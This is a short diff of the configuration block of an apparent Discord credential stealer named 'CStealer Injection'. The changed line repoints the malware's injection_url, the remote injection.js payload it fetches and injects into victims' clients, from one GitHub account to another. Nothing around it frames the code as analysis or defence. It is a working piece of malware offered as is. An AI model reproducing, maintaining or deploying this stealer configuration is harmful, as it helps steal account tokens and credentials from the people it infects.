@@ -14,7 +14,7 @@ const config = {
   embed_name: 'CStealer Injection', 
   embed_icon: 'https://partisan-omega.vercel.app/sdg.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/AUTTP/fidjkdsahjasd/main/injection.js', 
   /**
    
    **/
